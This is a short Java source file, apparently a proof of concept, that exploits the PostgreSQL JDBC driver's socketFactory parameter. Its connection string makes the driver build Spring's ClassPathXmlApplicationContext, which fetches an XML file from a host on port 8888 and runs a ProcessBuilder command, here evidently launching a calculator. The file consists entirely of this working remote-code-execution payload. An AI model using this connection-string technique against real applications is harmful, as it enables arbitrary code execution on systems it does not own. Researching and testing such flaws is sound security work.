package org.example.JDBC_Client;


import org.postgresql.Driver;

import java.sql.Connection;
import java.sql.DriverManager;

public class PostgreSQL_Spel_Client {

    public static void main(String[] args) throws Exception {
        String URL = "jdbc:postgresql://127.0.0.1:11111/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://127.0.0.1:8888/ProcesserBuilder_calc.xml";
        DriverManager.registerDriver(new Driver());
        Connection connection = DriverManager.getConnection(URL);
        connection.close();
    }
}
